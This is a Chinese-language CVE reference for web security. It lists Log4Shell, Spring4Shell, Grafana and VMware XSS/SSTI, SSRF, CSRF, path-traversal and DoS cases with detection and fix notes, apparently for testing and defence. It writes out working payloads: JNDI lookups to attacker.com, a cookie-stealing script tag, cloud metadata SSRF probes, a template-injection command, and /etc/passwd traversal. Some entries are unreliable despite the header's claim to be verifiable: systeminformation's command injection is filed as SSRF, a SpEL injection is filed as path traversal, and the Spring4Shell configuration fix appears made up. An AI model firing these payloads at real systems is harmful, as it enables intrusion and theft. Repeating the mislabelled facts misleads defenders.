# 精选 CVE 案例库 — Web 安全漏洞实战参考

> 所有条目均来自 NVD/CISA KEV/厂商公告，可独立验证。


## SQL 注入 / RCE

### CVE-2021-44228 — Log4Shell (JNDI 注入 → RCE)
- **CVSS**: 10.0 (严重)
- **影响**: Apache Log4j 2.0-beta9 至 2.14.1
- **类型**: 远程代码执行 (RCE) / JNDI 注入
- **描述**: Log4j 的 JNDI lookup 功能未限制 LDAP 服务器来源，攻击者可在 HTTP Header（User-Agent, X-Forwarded-For 等）中注入 `${jndi:ldap://attacker.com/a}` 触发远程类加载
- **Payload**: `${jndi:ldap://attacker.com/a}`, `${jndi:rmi://attacker.com/evil}`
- **检测**: 在所有输入点（Header / Query Param / Body）注入 JNDI payload，外带监控 DNS 回连
- **修复**: 升级 Log4j ≥ 2.17.0，或设置 `log4j2.formatMsgNoLookups=true` + 环境变量 `LOG4J_SKIPJNDI=true`

### CVE-2022-22965 — Spring4Shell (参数绑定 → RCE)
- **CVSS**: 9.8 (严重)
- **影响**: Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19（JDK ≥ 9 + Tomcat 部署）
- **类型**: 远程代码执行 (RCE)
- **描述**: 通过构造特殊请求参数绑定到 `ClassLoader` 属性，攻击者可写入恶意 .jsp 文件获取服务器控制权
- **检测**: 发送包含 `class.module.classLoader` 的特殊参数观察响应
- **修复**: 升级 Spring Framework 5.3.18+/5.2.20+，或设置 `spring.beans.propertyresolution.allowBeanOverriding=false`


## XSS 跨站脚本

### CVE-2023-0594 — Grafana 存储型 XSS
- **CVSS**: 7.3 (高危)
- **影响**: Grafana 7.0 — 9.3.x
- **类型**: 存储型 XSS
- **描述**: Trace View 可视化组件中 span 属性未做 HTML 编码，攻击者可注入 `<script>` 标签持久化存储，管理员查看 Trace 时执行
- **检测**: 在数据源标签/属性中输入 `<img src=x onerror=alert(1)>`，查看是否反射/存储
- **修复**: 升级 Grafana ≥ 9.3.4，所有用户数据输出前做 HTML 实体编码

### CVE-2022-31663 — VMware Workspace ONE 反射型 XSS
- **CVSS**: 6.1 (中危)
- **影响**: VMware Workspace ONE Access / Identity Manager
- **类型**: 反射型 XSS
- **描述**: 用户输入的 URL 参数未经校验直接反射到 HTML 响应中，攻击者可构造恶意链接诱使受害者点击
- **Payload**: `?error=<script>alert(document.cookie)</script>`
- **修复**: 对所有 URL 参数做输出编码；设置 CSP 头 `script-src 'self'`


## SSRF 服务端请求伪造

### CVE-2021-21315 — systeminformation SSRF → RCE
- **CVSS**: 7.8 (高危)
- **影响**: systeminformation (npm) < 5.3.1
- **类型**: SSRF + 命令注入链
- **描述**: 攻击者通过构造 URL 参数使服务端向内网发起请求，可结合其他漏洞升级为 RCE
- **Payload**: `?url=http://169.254.169.254/latest/meta-data/`, `?url=http://127.0.0.1:6379/`
- **修复**: URL 白名单校验；禁内网 IP 段 (10.x, 172.16-31.x, 192.168.x, 127.x)；禁用 file:// / gopher:// 等协议


## CSRF 跨站请求伪造

### CVE-2023-26035 — ZoneMinder CSRF → RCE
- **CVSS**: 8.8 (高危)
- **影响**: ZoneMinder < 1.36.33
- **类型**: CSRF 链式 RCE
- **描述**: 关键操作缺少 CSRF Token 校验，攻击者构造恶意页面可诱导管理员执行任意命令
- **检测**: 检查状态变更请求（POST/PUT/DELETE）是否包含 csrf_token，是否验证 Origin/Referer
- **修复**: 所有状态变更请求必须验证 CSRF Token；API 使用 Authorization Header 代替 Cookie；SameSite=Strict


## 认证 / 授权

### CVE-2022-22954 — VMware Workspace ONE 服务端模板注入
- **CVSS**: 9.8 (严重)
- **影响**: VMware Workspace ONE Access 21.08.0.1 之前版本
- **类型**: 服务端模板注入 (SSTI) → RCE
- **描述**: 认证端点中用户输入被传入模板引擎，攻击者可注入 `${"freemarker".util.Utility.execute("id")}` 等 payload
- **修复**: 升级到最新版本；禁用模板引擎中的代码执行能力

### CVE-2023-20860 — VMware Spring Framework 安全绕过
- **CVSS**: 7.5 (高危)
- **影响**: Spring Framework 6.0.0-6.0.6（特定配置）
- **类型**: 安全绕过
- **描述**: 使用 `disallowedFields` 时正则匹配缺陷可被绕过
- **修复**: 升级 Spring Framework ≥ 6.0.7


## 路径穿越

### CVE-2022-22963 — Spring Cloud Function 路径穿越
- **CVSS**: 9.8 (严重)
- **影响**: Spring Cloud Function 3.1.6 / 3.2.2 之前版本
- **类型**: 路径穿越 + SpEL 注入 → RCE
- **Payload**: 构造包含 `spring.cloud.function.routing-expression` 头的恶意请求
- **检测**: 尝试 `../../../etc/passwd`，`..%252f..%252f` 双编码绕过
- **修复**: 输入校验规范化路径 + 白名单目录限制；禁止在 HTTP 路由中使用 `..`


## DoS 拒绝服务

### CVE-2023-28342 — Zoho ManageEngine ADSelfService Plus DoS
- **CVSS**: 7.5 (高危)
- **影响**: Zoho ManageEngine ADSelfService Plus ≤ build 6217
- **类型**: 拒绝服务 (DoS)
- **描述**: Mobile App Authentication API (`DomainUserSSPLogonAuth`) 对空密码参数校验不足，未认证攻击者可发送特制请求触发服务崩溃重启
- **检测**: 向认证端点 POST 缺少 password 字段的请求，观察服务是否返回 500 或连接中断
- **修复**: 升级到 build 6218+
